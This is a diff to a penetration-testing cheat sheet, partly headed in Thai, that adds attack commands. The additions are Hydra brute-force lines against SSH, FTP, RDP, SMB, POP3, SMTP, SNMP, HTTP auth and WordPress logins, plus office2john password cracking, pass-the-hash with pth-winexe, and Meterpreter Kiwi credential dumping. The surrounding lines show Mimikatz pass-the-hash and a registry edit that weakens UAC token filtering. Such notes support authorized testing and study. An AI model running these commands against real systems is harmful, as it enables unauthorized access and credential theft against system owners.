@@ -783,12 +783,46 @@ crowbar --help
 # To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a wordlist (-C), and the number of threads (-n) 
 crowbar -b rdp -s 192.168.10.10/32 -u admin -C ~/password-file.txt -n 2
 
-# Hydra bruteforce ssh
-hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+# Hydra brute force against SNMP
+hydra -P password-file.txt -v $ip snmp
+
+# Hydra FTP known user and rockyou password list
+hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
+
+# Hydra SSH using list of users and passwords
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
+
+# Hydra SSH using a known password and a username list
+hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh
+
+# Hydra SSH Against Known username on port 22
+hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt
+
+# Hydra POP3 Brute Force
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
+
+# Hydra SMTP Brute Force
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
+
+# Hydra attack http get 401 login with a dictionary
+hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
+
+# Hydra attack Windows Remote Desktop with rockyou
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
+
+# Hydra brute force SMB user with rockyou:
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
+
+# Hydra brute force a Wordpress admin login
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
 
 # hashid indentification hash funtion
 hashid 5f4dcc3b5aa765d61d8327deb882cf99
 hashid b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
+
+#Office password cracking
+python ./office2john.py ./filename.docx
 ```
 
 - Windows Minikatz 
@@ -807,9 +841,11 @@ Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntl
 # Hash NTLM : e19ccf75ee54e86b06a5907af13cef42
 # Pass the hash 
 export SMBHASH=aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+pth-winexe -U unicorn% //$ip cmd
 pth-winexe -U unicorn //192.168.56.101 cmd
 
 pth-winexe -U unicorn%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.56.101 cmd
+
 # IF pth-winexe show ERROR: CreateService failed run command on Windows Administrator 
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
@@ -819,7 +855,13 @@ set SMBPass aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
 set lhost 192.168.10.10
 set rhosts 192.168.10.20
 run
+
+# Meterpreter Kiwi
+meterpreter> load kiwi
+meterpreter> help kiwi
+meterpreter> creds_all
 ```
+
 - การ Crack hash 
 ```bash
 cat hash.txt
